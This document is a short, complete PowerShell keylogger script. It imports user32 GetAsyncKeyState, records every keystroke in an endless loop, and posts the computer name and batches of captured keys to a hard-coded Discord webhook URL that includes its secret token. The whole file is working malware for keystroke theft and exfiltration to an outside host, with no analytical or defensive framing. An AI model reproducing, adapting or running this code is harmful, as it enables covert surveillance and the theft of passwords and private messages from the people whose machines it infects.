$webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'

iwr $webhook -Method Post -Body (@{content="Keylogger PowerShell natif lancé – $env:COMPUTERNAME"} | ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null

$signature = @'
[DllImport("user32.dll")]
public static extern int GetAsyncKeyState(int vKey);
[DllImport("user32.dll")]
public static extern int GetForegroundWindow();
[DllImport("user32.dll")]
public static extern int GetWindowText(int hWnd, System.Text.StringBuilder text, int count);
'@

Add-Type -MemberDefinition $signature -Name NativeMethods -Namespace Win32

$buffer = ''
while ($true) {
    Start-Sleep -m 40
    for ($i = 8; $i -le 254; $i++) {
        if ([Win32.NativeMethods]::GetAsyncKeyState($i) -eq -32767) {
            $buffer += [char]$i
            if ($buffer.Length -ge 30) {
                iwr $webhook -Method Post -Body (@{content=$buffer} | ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
                $buffer = ''
            }
        }
    }
}
